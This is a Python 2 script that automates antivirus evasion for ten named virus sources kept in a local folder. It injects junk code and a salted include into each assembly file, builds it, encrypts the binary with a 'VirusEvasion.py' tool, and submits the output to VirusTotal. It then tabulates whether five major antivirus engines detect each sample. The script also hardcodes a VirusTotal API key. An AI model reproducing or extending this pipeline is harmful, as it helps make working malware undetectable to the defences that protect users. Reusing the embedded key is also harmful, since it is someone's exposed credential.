# -*- coding: utf-8 -*-
import VirusTotal
import traceback
import os

apikey = r'34bfa9160e5ec9834a7aed717991c933a5ec9749615a0fceca71ff9afbd26a85'
root = r'D:\Virus-2015-01-16'
sasm = [r'analbeeds\AnalBeeds.ASM', r'antares\AnTaReS.asm', r'babylonia\babylon.asm', r'blackbat\blackbat.asm',
        r'blackhand\blackhand.asm', r'boundary\BOUNDARY.ASM', r'charm\CHARM.ASM', r'chthon\chthon.asm',
        r'cjdisease\cjdisease.ASM', r'dammit\DAM.ASM']
salt = 0xD3
junk_times = 100

resources = []
for asm in sasm:
    asm_path = os.path.join(root, asm)
    virus_path = os.path.split(asm_path)[0]
    magic_path = os.path.join(virus_path, 'magic.asm')
    output_path = os.path.join(virus_path, '{output}2.asm'.format(output=os.path.split(asm_path)[1].split('.')[0]))
    cmd = 'python includeAsm.py  {asm}  {has_data:d} {salt:d} {junk_times:d} {include_asm} {output_asm}'.format(
        asm=asm_path, has_data=1, salt=salt, junk_times=junk_times, include_asm=magic_path, output_asm=output_path)
    os.system(cmd)
    cwd = os.getcwd()
    os.chdir(virus_path)
    os.system('Make.bat')
    os.chdir(cwd)
    output = os.path.join(virus_path, 'output.exe~')
    cmd2 = r'python ../VirusEvasion.py --binary {virus} --output {output} -e -d {salt:d}'.format(
        virus=os.path.join(virus_path, '{0}2.exe~'.format(os.path.split(asm)[1].split('.')[0])),
        output=output,
        salt=salt
    )
    os.system(cmd2)

    resources.append([VirusTotal.scan(apikey, output), os.path.split(asm)[1].split('.')[0]])

# print resources
log = open(root + os.path.sep + 'report.txt', 'w')
print '[+] Retrieving scan report...'

Keys = ['AVG', 'Kaspersky', 'McAfee', 'Qihoo-360', 'Symantec']
print '{0:20s}'.format('Options'),
print >>log, '{0:20s}'.format('Options'),

for key in Keys:
    print '{0:10s}'.format(key),
    print >>log, '{0:10s}'.format(key),
print '{0:10s}'.format('Overall')
print >>log, '{0:10s}'.format('Overall')

next_index = 0
while True:
    resource = resources[next_index][0]
    # print resource
    result = VirusTotal.report(apikey, resource)
    if result is None:
        next_index += 1
        next_index %= len(resources)
        continue

    print '{0:20s}'.format(resources[next_index][1]),
    print >>log, '{0:20s}'.format(resources[next_index][1]),
    for key in Keys:
        try:
            if result['scans'][key]['detected']:
                print '{0:10s}'.format('FAIL'),
                print >>log, '{0:10s}'.format('FAIL'),
            else:
                print '{0:10s}'.format('PASS'),
                print >>log, '{0:10s}'.format('PASS'),
        except KeyError:
            print '{0:10s}'.format('UDF'),
            print >>log, '{0:10s}'.format('UDF'),
            # print traceback.format_exc()
            # print result
            # exit(-1)
    print result['positives'], '/', result['total']
    print >>log, result['positives'], '/', result['total']

    del resources[next_index]
    next_index += 1
    if len(resources) == 0:
        break
    next_index %= len(resources)




